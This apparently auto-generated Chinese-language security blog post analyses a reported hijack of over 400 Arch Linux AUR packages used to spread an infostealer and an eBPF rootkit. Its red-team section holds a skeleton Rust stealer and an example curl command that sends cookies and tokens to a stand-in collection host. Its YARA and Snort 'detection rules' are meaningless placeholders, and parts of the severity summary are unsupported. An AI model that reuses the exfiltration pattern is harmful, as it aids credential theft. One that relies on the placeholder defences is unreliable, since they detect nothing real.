---
layout: post
title:  "Over 400 Arch Linux AUR Packages Hijacked to Deploy Infostealer and eBPF Rootkit"
date:   2026-06-13 02:43:53 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Arch Linux AUR 套件攻擊：利用信任模型漏洞進行憑證竊取
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 8.7)
> * **受駭指標**: LPE (Local Privilege Escalation) 和 Info Leak
> * **關鍵技術**: eBPF, Rust, npm, PKGBUILD

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用 Arch Linux AUR (Arch User Repository) 的信任模型漏洞，採用了 400 多個套件，並修改了其建構腳本以安裝憑證竊取軟體。
* **攻擊流程圖解**:
  1. 攻擊者採用被棄用的套件。
  2. 修改套件的建構腳本以安裝惡意軟體。
  3. 使用者安裝或更新套件時，惡意軟體被執行。
* **受影響元件**: Arch Linux AUR 套件，特別是那些被棄用的套件。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 AUR 套件的維護權限。
* **Payload 建構邏輯**:

    ```
    
    rust
      // 惡意軟體的基本結構
      use std::fs;
      use std::io;
    
      fn main() {
        //竊取憑證和敏感信息
        let cookies = get_cookies();
        let tokens = get_tokens();
        //發送竊取的信息到遠端伺服器
        send_info_to_server(cookies, tokens);
      }
    
    ```
  *範例指令*: `curl -X POST -H "Content-Type: application/json" -d '{"cookies": "cookie_value", "tokens": "token_value"}' http://example.com/collect_info`
* **繞過技術**: 攻擊者使用 eBPF 根套件來隱藏惡意軟體的行為。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 6144d433f8a0316869877b5f834c801251bbb936e5f1577c5680878c7443c98b |  |  | /var/lib/ |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule malicious_software {
        meta:
          description = "Detect malicious software"
          author = "Your Name"
        strings:
          $a = "malicious_string"
        condition:
          $a
      }
    
    ```
  或者是使用 Snort/Suricata Signature：

```

snort
  alert tcp any any -> any any (msg:"Malicious Software Detected"; sid:1000000;)

```
* **緩解措施**: 更新 AUR 套件，檢查套件的建構腳本，使用安全的套件管理工具。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **eBPF (Extended Berkeley Packet Filter)**: 一種 Linux 內核技術，允許用戶空間程式碼在內核中執行。
* **Rust**: 一種系統編程語言，注重安全性和性能。
* **npm (Node Package Manager)**: 一種 Node.js 套件管理工具。
* **PKGBUILD**: 一種 Arch Linux 套件建構腳本。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/over-400-arch-linux-aur-packages.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1055/)


